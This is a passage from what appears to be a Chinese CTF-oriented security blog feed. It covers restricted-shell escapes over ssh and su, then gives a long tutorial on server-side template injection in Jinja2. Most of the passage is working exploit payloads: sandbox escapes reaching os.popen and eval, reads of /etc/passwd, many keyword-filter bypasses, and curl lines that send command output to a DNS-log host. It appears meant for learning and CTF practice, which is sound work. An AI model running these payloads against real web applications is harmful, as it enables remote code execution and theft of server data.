<h3 id="ssh登录逃逸"><a class="markdownIt-Anchor" href="#ssh登录逃逸"></a> SSH登录逃逸</h3>
<pre><code class="highlight plaintext">ssh username@IP -t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;
ssh username@IP -t &quot;bash --noprofile&quot;
ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot;   ###shellshock
ssh username@IP  &quot;export TERM=xterm;python -c  &#x27;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&#x27;</code></pre>
<h3 id="切换用户逃逸"><a class="markdownIt-Anchor" href="#切换用户逃逸"></a> 切换用户逃逸</h3>
<p>这里的原理涉及到su 和 su- 的区别：</p>
<ul>
<li>su命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的</li>
<li>su- 命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为/root/，环境变量也变了</li>
</ul>
<pre><code class="highlight plaintext">su -l user
su - user
su --login user</code></pre>
<p>还可以边切换边打shell</p>
<pre><code class="highlight plaintext">su -c &quot;python -c  &#x27;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&#x27;&quot; user</code></pre>
<h3 id="篡改path-shell环境变量"><a class="markdownIt-Anchor" href="#篡改path-shell环境变量"></a> 篡改PATH /Shell环境变量</h3>
<pre><code class="highlight plaintext">export -p//查看环境变量
如果有可以写入的文件就尝试写入到/bin/bash里面</code></pre>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI漏洞</title>
    <url>/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="ssti模板注入漏洞"><a class="markdownIt-Anchor" href="#ssti模板注入漏洞"></a> SSTI(模板注入)漏洞</h1>
<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
<h2 id="模板注入漏洞"><a class="markdownIt-Anchor" href="#模板注入漏洞"></a> 模板注入漏洞</h2>
<p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
<p>当前使用的一些框架，比如python的<code>flask</code>，php的<code>tp</code>，java的<code>spring</code>等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
<p>漏洞成因就是服务端接收了用户的恶意输入(一般来说是用户输入的变量)以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
<h2 id="确定漏洞"><a class="markdownIt-Anchor" href="#确定漏洞"></a> 确定漏洞</h2>
<p>贴个图</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti.png" alt="ssti"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti2.png" alt="ssti2"></p>
<h3 id="第一层"><a class="markdownIt-Anchor" href="#第一层"></a> 第一层：</h3>
<ul>
<li>如果可以执行${7*7}的结果，那我们进入第二层的<code>a&#123;*comment*&#125;b</code>，如果没用执行结果，那就进入第二层的<code>&#123;&#123;7*7&#125;&#125;</code></li>
<li>在Mako模板引擎中我们也是${}形式的</li>
</ul>
<h3 id="第二层"><a class="markdownIt-Anchor" href="#第二层"></a> 第二层：</h3>
<ul>
<li>在<code>a&#123;*comment*&#125;b</code>中，如果{**}被当作注释而输出ab，我们就可以确定这个地方是Smarty模板，如果不能，进入第三层；</li>
<li>在<code>&#123;&#123;7*7&#125;&#125;</code>中，如果能够执行，那我们进入第三层。</li>
</ul>
<h3 id="第三层"><a class="markdownIt-Anchor" href="#第三层"></a> 第三层：</h3>
<ul>
<li>当49的结果为49时，对应着Twig模板类型，而结果如果为7777777，则对应着Jinja2的模板类型</li>
<li>当能够执行<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>,我们就能确定是Mako模板，能够直接执行python命令.</li>
</ul>
<p>接下来就进入不同模板的不同注入方式</p>
<h2 id="python模板注入"><a class="markdownIt-Anchor" href="#python模板注入"></a> Python模板注入</h2>
<h3 id="jinja2"><a class="markdownIt-Anchor" href="#jinja2"></a> jinja2</h3>
<p>python的一种主流模板，基本你看到页面在输入后会实时回显在页面并且发包后看出语言是python基本就能确认是</p>
<pre><code class="highlight plaintext">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 7777777 -&gt; jinjia2</code></pre>
<p>这里先简单介绍一下jinja2的语法好了</p>
<h4 id="语法结构"><a class="markdownIt-Anchor" href="#语法结构"></a> 语法结构</h4>
<p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取</p>
<p>Jinja2 模板同样支持控制语句，像在 <code>&#123;%…%&#125; </code>块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子:</p>
<p><code>&lt;ul&gt;     &#123;% for comment in comments %&#125;
         <li>&#123;&#123;comment&#125;&#125;</li>
    &#123;% endfor %&#125;&lt;ul&gt;</code></p>
<p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值</p>
<pre><code class="highlight html">Hello, &#123;&#123;name|capitalize&#125;&#125;</code></pre>
<p>但是这只能在渲染前的模板中进行注入，如果模板已经渲染，就不存在模板注入了:</p>
<pre><code class="highlight plaintext">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)

    t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)
    return t.render(n=name)

if __name__ == &quot;__main__&quot;:
    app.run()</code></pre>
<p>编译运行，再次注入就会失败<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1344396-20200903151308616-823367288.png" alt="img"></p>
<pre><code class="highlight plaintext">&#123;% ... %&#125; for Statements #用来声明变量，也可以用于条件语句和循环语句
例子:
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__==&#x27;file&#x27; %&#125;
&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;
 
&#123;&#123; ... &#125;&#125; for Expressions to print to the template output #将表达式打印到模板输出
 
&#123;# ... #&#125; for Comments not included in the template output #表示未包含在模板输出中的注释
 
#...# for Line Statements #有和&#123;%%&#125;相同的效果</code></pre>
<p>有些时候过滤可能会ban掉双括号，这时候可能就需要用到上面的一些语法</p>
<h4 id="jinja2的俄罗斯套娃"><a class="markdownIt-Anchor" href="#jinja2的俄罗斯套娃"></a> jinja2的俄罗斯套娃</h4>
<p>看过jinja2相关模板注入题目的人就能明白是什么意思了哈哈()</p>
<p>介绍一下基类的一些概念之类的吧</p>
<p><code>'' [] ()</code>都是最简单的数据类型，而我们最一般的思路就是通过这些来找到基类，这里就要涉及到一些魔术方法了</p>
<p>那就按顺序进行一个介绍吧</p>
<p>首先，我们的目的是要找到基类</p>
<p>于是我们就要用到<code>__class__</code>返回一个实例所属的类</p>
<p>但是我们的目的是找到Object基类，那么我们需要进一步返回</p>
<p>所以就要用到<code>__base__ __bases__  __mro__</code></p>
<p><code>base</code>最为直接，就是直接返回上层的父类，而<code>bases</code>是递归返回所有上面的类，术语上是叫元组，<code>mro</code>同理,但是会包含原来就所属的类</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250414125152769.png" alt="image-20250414125152769"></p>
<p>找到Object之后呢，由于我们的目的是得到一个可以任意命令执行的板块，我们就需要找到<code>os</code>这些类似的方法，那么就要用到<code>__subclass__()</code>以及后面的一些东西</p>
<p>subclasses是返回子类，通常这个时候就会跳一大串的子类，没脚本是不得行的(不是哥们你真想手找吗)</p>
<p>而返回子类后我们就要做出一个重大的决策，根据版本打不同的payload,详见文件读取的子类(py2人上人)</p>
<p>一般我们的选择 是两种</p>
<ul>
<li>文件读取</li>
<li>内置模块任意命令执行</li>
</ul>
<pre><code class="highlight python"><span class="comment">#文件读取</span>
<span class="comment">#python2</span>
file -&gt;(<span class="string">&#x27;path&#x27;</span>).read()
<span class="comment">#python3</span>
_frozen_importlib_external.FiieLoader -&gt;[<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)
<span class="comment">#当然也可以拿内置模块再文件读取，但是感觉不得已才会这样打</span></code></pre>
<pre><code class="highlight python"><span class="comment">#函数rce</span>
<span class="comment">#不知道和版本有没有关系，反正找到还没有被过滤直接打就行</span>
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;
&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami’)&#125;&#125;</span>
<span class="string">&#123;&#123; &#x27;</span><span class="string">&#x27;.__class__.__base__.__subclasses__()[10].__init__.__globals__[&#x27;</span>__builtins__<span class="string">&#x27;][&#x27;</span><span class="built_in">eval</span><span class="string">&#x27;](&#x27;</span><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()<span class="string">&#x27;) &#125;&#125;#eval</span></code></pre>
<pre><code class="highlight python"><span class="comment">#类的rce</span>
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]__.__subclasses__()[xx][<span class="string">&#x27;load_moudule&#x27;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;<span class="comment">#importlib</span>
&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro[<span class="number">2</span>]__.__subclasses__()[xx].Popen(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;<span class="comment">#subprocess.Popen 个人觉得唯一真神好吧</span></code></pre>
<pre><code class="highlight python"><span class="comment">#内置OS模块rce(这个其实就多了哈哈)不管类内置的还是函数内置的有就行了，这边重点介绍类的吧，因为函数内置的后面会讲的</span>
os._wrap_close //<span class="number">117</span>
warnings.catch_warnings //<span class="number">59</span>
warnings.WarningMessage
socket._socketobject
site._Printer //<span class="number">71</span>
site.Quitte
subprocess.Popen //<span class="number">258</span></code></pre>
<p>再贴一个找到内置os模块的脚本</p>
<pre><code class="highlight plaintext">#coding:utf-8search = &#x27;os&#x27;   #也可以是其他你想利用的模块
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass</code></pre>
<p>后面的操作就比较公式化了</p>
<p>直接贴一下好了</p>
<pre><code class="highlight python"><span class="comment">#python2</span>
__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)
__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()
__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)
__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)
__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)

<span class="comment">#python3</span>
__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()
__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)
__init__[<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()
__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)
__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span>
<span class="string">__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read()</span>
<span class="string"></span></code></pre>
<p><strong>觉得烦?那最快的就来了</strong></p>
<p>利用flask内置函数，效率高，payload短，就是容易被ban(</p>
<pre><code class="highlight jinja2">1)config #获取配置信息
&#123;&#123;config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;cat+/flag&quot;).read()&#125;&#125;

2)lipsum
&#123;&#123; lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read() &#125;&#125;

3)request
&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
&#123;&#123;request.application.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;

4)url_for
&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
利用其读到环境变量:url_for.__globals__[&#x27;current_app&#x27;].config
5)get_flashed_messages
&#123;&#123;get_flashed_messages.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
利用其读到环境变量:get_flashed_messages.__globals__[&#x27;current_app&#x27;].config</code></pre>
<p>**后记：**打过内存马之后如见天地啊，，能利用的内置函数远远不止这么一些</p>
<p>能获取 <code>__globals__</code> 的有：</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>context</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>url_for.__globals__</code></td>
<td>flask.app or flask.helpers</td>
</tr>
<tr>
<td><code>get_flashed_messages.__globals</code>__</td>
<td>flask.helpers</td>
</tr>
<tr>
<td><code>request.__init__.__globals</code>__</td>
<td>werkzeug.wrappers.request</td>
</tr>
<tr>
<td><code>request.application.__globals__</code></td>
<td>werkzeug.wrappers.request</td>
</tr>
<tr>
<td><code>session.__init__.__globals__</code></td>
<td>flask.sessions</td>
</tr>
<tr>
<td><code>config.__class__.__init__.__globals__</code></td>
<td>flask.config</td>
</tr>
</tbody>
</table>
<p>再加上 Jinja2 默认定义在上下文中的一些变量</p>
<p><a href="http://www.caterpie771.cn/wp-content/uploads/myimgs/6066fbff4ce29a6a6a2d4748584b27f9.png"><img src="http://www.caterpie771.cn/wp-content/uploads/myimgs/6066fbff4ce29a6a6a2d4748584b27f9.png" alt="截图"></a></p>
<table>
<thead>
<tr>
<th>payload</th>
<th>context</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>lipsum.__globals__</code></td>
<td>jinja2.utils</td>
</tr>
<tr>
<td><code>cycler.__init__.__globals__</code></td>
<td>jinja2.utils</td>
</tr>
<tr>
<td><code>joiner.__init__.__globals__</code></td>
<td>jinja2.utils</td>
</tr>
<tr>
<td><code>namespace.__init__.__globals__</code></td>
<td>jinja2.utils</td>
</tr>
</tbody>
</table>
<p>这些都能用来做 SSTI bypass</p>
<p>(来自<a href="https://www.caterpie771.cn/">caterpie</a>师傅的一篇博客里记述的)</p>
<hr>
<p><strong>总结一下，就是先找到一个合适的攻城锤(内含os的类或可命令执行的函数)和一把趁手的宝剑(可以使用的方法)</strong></p>
<h4 id="jinja2的过滤"><a class="markdownIt-Anchor" href="#jinja2的过滤"></a> jinja2的过滤</h4>
<p><strong>过滤[</strong></p>
<pre><code class="highlight python"><span class="comment">#getitem、pop</span>
<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()
<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()
<span class="comment">#也可以用__getattribute__绕过</span>
&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;
<span class="comment">#或者配合request</span>
&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami

<span class="comment">#或者用print标记</span>
&#123;%<span class="built_in">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</code></pre>
<p><strong>过滤引号</strong></p>
<pre><code class="highlight plaintext">#chr函数
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;
#request对象
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd
#命令执行
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id
#request 绕过
&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd    
\#分析：
request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。
若args被过滤了，还可以使用values来接受GET或者POST参数。：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;
Cookie:arg1=open;arg2=/etc/passwd
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;
post:arg1=open&amp;arg2=/etc/passwd</code></pre>
<p><strong>过滤下划线</strong></p>
<pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
//request.args.xx就能直接查询对应的参数值，把原参数换成[request.args.xx]即可</code></pre>
<p><strong>过滤花括号</strong></p>
<pre><code class="highlight plaintext">#用&#123;%%&#125;标记，同时外带
&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;
&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__[&#x27;popen&#x27;](&quot;curl `whoami`.k1o75b.ceye.io&quot;).read()==&#x27;kawhi&#x27; %&#125;1&#123;% endif %&#125;</code></pre>
<p><strong>过滤关键字</strong></p>
<ul>
<li>利用内置的语法传参的值：</li>
</ul>
<p>如<code>request.args.[变量名](get传参) request.cookies.[变量名](cookies传参)</code></p>
<ul>
<li>使用切片将逆置的关键字顺序输出，进而达到绕过。</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</code></pre>
<ul>
<li>反转</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__ssalc__&quot;][::-1]
&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>
<ul>
<li>利用&quot;+&quot;进行字符串拼接，绕过关键字过滤。</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
[][%27__cla%27+%27ss__%27][%27__ba%27+%27se__%27][%27__subcl%27+%27asses__%27]()[117][&quot;__in&quot;+&quot;it__&quot;][&quot;__glo&quot;+&quot;bals__&quot;][&#x27;popen&#x27;](&#x27;ls /&#x27;).read()</code></pre>
<ul>
<li>join拼接</li>
</ul>
<p>利用join（）函数绕过关键字过滤</p>
<pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;
&#123;&#123;()|attr([&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2]|join)&#125;&#125;
&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</code></pre>
<ul>
<li>利用引号绕过</li>
</ul>
<pre><code class="highlight plaintext">[&#123;&#123;[].__class__.__base__.__subclasses__()40&quot;/fl&quot;&quot;ag&quot;.read()&#125;&#125;]()</code></pre>
<ul>
<li>使用str原生函数replace替换</li>
</ul>
<p>将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。</p>
<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</code></pre>
<ul>
<li>ascii转换</li>
</ul>
<pre><code class="highlight plaintext">将每一个字符都转换为ascii值后再拼接在一起。

&quot;&#123;0:c&#125;&quot;.format(97)=&#x27;a&#x27;
&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</code></pre>
<ul>
<li>16进制编码绕过</li>
</ul>
<pre><code class="highlight plaintext">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;

例子：
&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;
\
同理，也可使用八进制编码绕过</code></pre>
<ul>
<li>
<p>base64编码绕过</p>
<p>对于python2，可利用base64进行绕过，对于python3没有decode方法，不能使用该方法进行绕过。</p>
</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;
//__class__</code></pre>
<p>例子：</p>
<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;  
等价于  
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</code></pre>
<ul>
<li>unicode编码绕过</li>
</ul>
<pre><code class="highlight jinja2">&#123;%print((((lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;os&quot;))|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;
等同于lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac /f*&#x27;).read()</code></pre>
<ul>
<li>Hex编码绕过</li>
</ul>
<pre><code class="highlight jinja2">[&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;]()
&#123;#温馨提示，连关键词都转换掉是有概率褒姒的，推荐用来绕过一下符号的过滤差不多够用了#&#125;

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;   
等价于   
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</code></pre>
<ul>
<li>绕过<strong>init</strong><br>
可以用<code>__enter__</code>或<code>__exit__</code>替代<code>__init__</code></li>
</ul>
<pre><code class="highlight plaintext">&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>
<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>
<ul>
<li>绕过config</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;
&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre>
<ul>
<li>过滤args和.和_</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;()|attr(request[&#x27;values&#x27;][&#x27;x1&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x2&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x3&#x27;])()|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(40)|attr(request[&#x27;values&#x27;][&#x27;x5&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x6&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x7&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x8&#x27;])(request[&#x27;values&#x27;][&#x27;x9&#x27;])&#125;&#125;

